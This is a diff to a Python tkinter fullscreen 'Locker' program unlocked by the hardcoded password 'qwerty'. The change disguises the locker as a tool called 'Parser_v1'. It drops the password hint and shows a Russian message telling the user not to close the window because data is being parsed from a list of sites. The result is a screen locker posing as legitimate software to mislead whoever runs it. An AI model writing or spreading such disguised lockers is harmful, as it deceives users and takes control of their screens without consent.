@@ -12,7 +12,11 @@ locker_pass = "qwerty"
 
 def locker():
     global k, entry
-
+    try:
+        with open("sites.txt", "r", encoding="utf-8") as file:
+            sites = file.read().strip().splitlines()  # Читаем строки и разделяем их
+    except FileNotFoundError:
+        sites = ["Файл sites.txt не найден."]
     def callback(event):
         global k
         if entry.get() == locker_pass:
@@ -35,10 +39,25 @@ def locker():
     root.title("Locker")
     root.attributes("-fullscreen", True)
     entry = Entry(root, font=1)
-    label0 = Label(root, text="Locker_by_#571", font=1)
+    label0 = Label(root, text="Parser_v1", font=1)
     label0.grid(row=0, column=0)
-    label1 = Label(root, text="Write the Password and Press Ctrl+C", font='Arial 20')
-    label1.place(x=470, y=300)
+
+    # Разделение на две колонки
+    half = len(sites) // 2 + len(sites) % 2  # Учитываем нечетное количество
+    column1 = sites[:half]
+    column2 = sites[half:]
+    # Форматирование текста для двух колонок
+    sites_text = "\n".join(f"{c1:<30}{c2}" for c1, c2 in zip(column1, column2 + [""] * (len(column1) - len(column2))))
+
+    # Метка с текстом из файла
+    label_instruction = Label(
+        root,
+        text=f"Не закрывайте окно! Парсим данные с сайтов:\n{sites_text}",
+        font="Arial 20",
+        justify="left",
+    )
+    label_instruction.place(x=50, y=50)
+
     entry.place(width=150, height=50, x=600, y=400)
     root.update()
     sleep(0.2)
